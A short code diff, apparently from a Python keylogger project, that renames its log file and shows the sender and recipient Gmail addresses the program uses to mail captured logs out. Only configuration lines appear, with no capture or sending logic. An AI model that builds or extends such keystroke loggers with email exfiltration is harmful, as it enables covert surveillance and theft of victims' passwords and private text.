@@ -9,7 +9,7 @@ from email import encoders
 
 
 # Global variables for easier testing
-filename = "the_keylogger_i_made_log.txt"
+filename = "log.txt"
 path = ""
 fromaddr = "somethingawesomekeylogger58@gmail.com"
 toaddr = "somethingawesomekeylogger58@gmail.com"
